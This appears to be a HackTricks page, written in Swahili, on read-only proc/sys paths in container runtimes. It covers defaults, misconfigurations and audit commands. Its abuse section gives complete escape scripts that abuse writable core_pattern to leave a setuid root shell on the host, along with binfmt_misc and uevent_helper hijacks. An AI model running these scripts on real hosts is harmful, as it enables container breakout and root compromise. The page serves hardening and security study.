# Njia za Mfumo za Kusoma-Tu

{{#include ../../../../banners/hacktricks-training.md}}

Njia za mfumo za kusoma-tu ni ulinzi tofauti na masked paths. Badala ya kuficha path kabisa, runtime huiweka wazi lakini huimount ikiwa ya kusoma-tu. Hili ni jambo la kawaida kwa maeneo yaliyochaguliwa ya procfs na sysfs ambapo access ya kusoma inaweza kukubalika au kuwa muhimu kiutendaji, lakini uandishi ungekuwa hatari sana.

Madhumuni yake ni ya moja kwa moja: interfaces nyingi za kernel huwa hatari zaidi zinapoweza kuandikwa. Mount ya kusoma-tu haiondoi thamani yote ya reconnaissance, lakini huzuia workload iliyoathirika kurekebisha files zinazoelekezwa kwenye kernel kupitia path hiyo.

## Uendeshaji

Runtimes mara nyingi huweka sehemu za mwonekano wa proc/sys kuwa za kusoma-tu. Kulingana na runtime na host, hii inaweza kujumuisha paths kama:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

Orodha halisi hutofautiana, lakini model ni ileile: ruhusu visibility inapohitajika, kataa mutation kwa default.<sup>[[1]](#references)</sup>

## Lab

Kagua orodha ya paths za kusoma-tu iliyotangazwa na Docker:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Kagua mwonekano wa proc/sys uliowekwa kutoka ndani ya container:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Athari za Usalama

Read-only system paths hupunguza kwa kiasi kikubwa kundi kubwa la matumizi mabaya yanayoathiri host. Hata mshambuliaji anapoweza kukagua procfs au sysfs, kutoweza kuandika humo huondoa njia nyingi za moja kwa moja za kufanya marekebisho zinazohusisha kernel tunables, crash handlers, module-loading helpers, au control interfaces nyingine. Exposure haijaondoka, lakini mabadiliko kutoka information disclosure hadi host influence huwa magumu zaidi.

## Mipangilio Isiyo Sahihi

Makosa makuu ni kuondoa masking au kure-mount paths nyeti zikiwa read-write, kufichua proc/sys content ya host moja kwa moja kupitia writable bind mounts, au kutumia privileged modes ambazo kwa ufanisi hupita salama runtime defaults. Katika Kubernetes, `procMount: Unmasked` na privileged workloads mara nyingi huambatana na proc protection dhaifu.<sup>[[2]](#references)</sup> Kosa lingine la kawaida la kiutendaji ni kudhani kwamba kwa sababu runtime kwa kawaida hu-mount paths hizi zikiwa read-only, workloads zote bado zinarithi default hiyo.

## Matumizi Mabaya

Ikiwa protection ni dhaifu, anza kwa kutafuta proc/sys entries zinazoweza kuandikwa:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Wakati entries zinazoweza kuandikwa zinapokuwepo, paths zenye thamani kubwa za ufuatiliaji ni pamoja na:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
Kile ambacho amri hizi zinaweza kufichua:

- Entries zinazoweza kuandikwa chini ya `/proc/sys` mara nyingi humaanisha kuwa container inaweza kurekebisha tabia ya kernel ya host badala ya kuikagua tu.
- `core_pattern` ni muhimu hasa kwa sababu value inayoweza kuandikwa na inayolenga host inaweza kubadilishwa kuwa njia ya host code execution kwa ku-crash process baada ya kuweka pipe handler.
- `modprobe` hufichua helper inayotumiwa na kernel kwa michakato inayohusiana na upakiaji wa modules; ni target ya kawaida yenye thamani kubwa inapoweza kuandikwa.
- `binfmt_misc` hukuambia ikiwa usajili wa custom interpreter unawezekana. Ikiwa usajili unaweza kuandikwa, hii inaweza kuwa execution primitive badala ya kuwa information leak tu.
- `panic_on_oom` hudhibiti uamuzi wa kernel unaohusu host nzima na kwa hivyo inaweza kubadilisha resource exhaustion kuwa host denial of service.
- `uevent_helper` ni mojawapo ya mifano iliyo wazi zaidi ambapo sysfs helper path inayoweza kuandikwa husababisha execution katika host context.

Findings zinazovutia zinajumuisha proc knobs au sysfs entries zinazolenga host na zinaweza kuandikwa, ingawa kwa kawaida zinapaswa kuwa read-only. Kufikia hapo, workload imehama kutoka kwenye mtazamo wa container uliozuiwa kuelekea ushawishi wa maana kwenye kernel.

### Mfano Kamili: `core_pattern` Host Escape

Ikiwa `/proc/sys/kernel/core_pattern` inaweza kuandikwa kutoka ndani ya container na inaelekeza kwenye host kernel view, inaweza kutumiwa vibaya ku-execute payload baada ya crash:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Ikiwa path hiyo kwa kweli inafikia host kernel, payload huendeshwa kwenye host na huacha setuid shell.

### Mfano Kamili: `binfmt_misc` Registration

Ikiwa `/proc/sys/fs/binfmt_misc/register` inaweza kuandikwa, custom interpreter registration inaweza kuwezesha code execution wakati faili linalolingana linapoendeshwa:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Kwenye `binfmt_misc` inayotazamana na host na inayoweza kuandikwa, matokeo ni code execution katika interpreter path inayoanzishwa na kernel.

### Mfano Kamili: `uevent_helper`

Ikiwa `/sys/kernel/uevent_helper` inaweza kuandikwa, kernel inaweza kuendesha host-path helper wakati event inayolingana inapoanzishwa:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Sababu ya hili kuwa hatari sana ni kwamba njia ya helper hutatuliwa kwa mtazamo wa mfumo wa faili wa host badala ya muktadha salama wa container pekee.

## Ukaguzi

Ukaguzi huu huamua ikiwa mwonekano wa procfs/sysfs ni wa read-only inapotarajiwa kuwa hivyo, na ikiwa workload bado inaweza kurekebisha interfaces nyeti za kernel.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Kinachovutia hapa:

- Workload ya kawaida iliyoimarishwa inapaswa kufichua entries chache sana za proc/sys zinazoweza kuandikwa.
- Njia za `/proc/sys` zinazoweza kuandikwa mara nyingi ni muhimu zaidi kuliko access ya kawaida ya kusoma.
- Ikiwa runtime inasema path ni ya kusomeka tu lakini kiuhalisia inaweza kuandikwa, kagua kwa makini mount propagation, bind mounts, na mipangilio ya privilege.

## Runtime Defaults

| Runtime / platform | Hali ya default | Tabia ya default | Udhaifu wa kawaida unaowekwa manually |
| --- | --- | --- | --- |
| Docker Engine | Imewezeshwa kwa default | Docker huweka orodha ya default ya paths za kusomeka tu kwa proc entries nyeti | kufichua host proc/sys mounts, `--privileged` |
| Podman | Imewezeshwa kwa default | Podman hutumia paths za default za kusomeka tu isipokuwa zilegezwе wazi | `--security-opt unmask=ALL`, host mounts pana, `--privileged` |
| Kubernetes | Hurithi defaults za runtime | Hutumia modeli ya underlying runtime ya paths za kusomeka tu isipokuwa idhoofishwe na Pod settings au host mounts | `procMount: Unmasked`, privileged workloads, writable host proc/sys mounts |
| containerd / CRI-O under Kubernetes | Default ya runtime | Kwa kawaida hutegemea defaults za OCI/runtime | sawa na mstari wa Kubernetes; mabadiliko ya moja kwa moja kwenye runtime config yanaweza kudhoofisha tabia hii |

Jambo kuu ni kwamba system paths za kusomeka tu kwa kawaida huwa sehemu ya runtime default, lakini ni rahisi kuzidhoofisha kwa privileged modes au host bind mounts.

## References

- [1] [OCI Runtime Specification: Linux Container Configuration (maskedPaths / readonlyPaths)](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md)
- [2] [Kubernetes API Reference: Pod v1 (SecurityContext.procMount)](https://kubernetes.io/docs/reference/kubernetes-api/workload-resources/pod-v1/)

{{#include ../../../../banners/hacktricks-training.md}}
